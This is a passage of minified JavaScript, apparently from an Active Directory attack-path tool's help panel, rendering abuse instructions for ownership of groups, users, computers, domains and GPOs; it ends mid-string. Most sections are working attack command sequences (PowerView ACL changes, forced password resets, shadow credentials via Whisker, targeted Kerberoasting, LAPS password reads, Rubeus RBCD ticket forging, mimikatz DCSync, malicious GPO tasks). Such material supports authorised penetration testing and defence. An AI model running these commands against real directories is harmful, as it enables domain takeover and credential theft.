noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/",children:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/kb5008383-active-directory-permissions-updates-cve-2021-42291-536d5555-ffba-4248-a60e-d6cbc849cde1",children:"https://support.microsoft.com/en-us/topic/kb5008383-active-directory-permissions-updates-cve-2021-42291-536d5555-ffba-4248-a60e-d6cbc849cde1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/fb7c101d-ec8b-4fbf-bca8-7d7c2d747d0c",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/fb7c101d-ec8b-4fbf-bca8-7d7c2d747d0c"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e5899be4-862e-496f-9a38-33950617d2c5",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e5899be4-862e-496f-9a38-33950617d2c5"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers",children:"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers"})]}),mm=({sourceName:r,sourceType:a,targetName:o,targetType:i,targetId:s,haslaps:c})=>{switch(i){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),e.jsx(t,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),e.jsx(t,{component:"pre",children:'Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to change the password of the user"," ",o,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsxs(t,{variant:"body2",children:["Alternatively, GenericAll enables ",r," to set a ServicePrincipalName (SPN) on the targeted user, which may be abused in a Targeted Kerberoast attack."]}),e.jsx(t,{variant:"body1",children:" Force Change Password attack "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast attack "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to obtain the LAPS (RID 500 administrator) password of ",o,"."]}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"}),e.jsx(t,{component:"pre",children:'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}),e.jsx(t,{variant:"body2",children:"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"}),e.jsx(t,{component:"pre",children:'Get-LapsADPassword "WIN10" -AsPlainText'}),e.jsxs(t,{variant:"body2",children:["The encrypted attributes can also be retrieved and decrypted using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"lapsv2decrypt"})," ","(dotnet or BOF)."]}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this permission, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Alternatively, you can grant GenericAll on the domain and execute one of the follwing attacks."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the domain object."}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to the domain:"}),e.jsx(t,{component:"pre",children:`$DomainDN = "DC=dumpster,DC=fire"
$dsEntry = [ADSI]"LDAP://$DomainDN"
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization 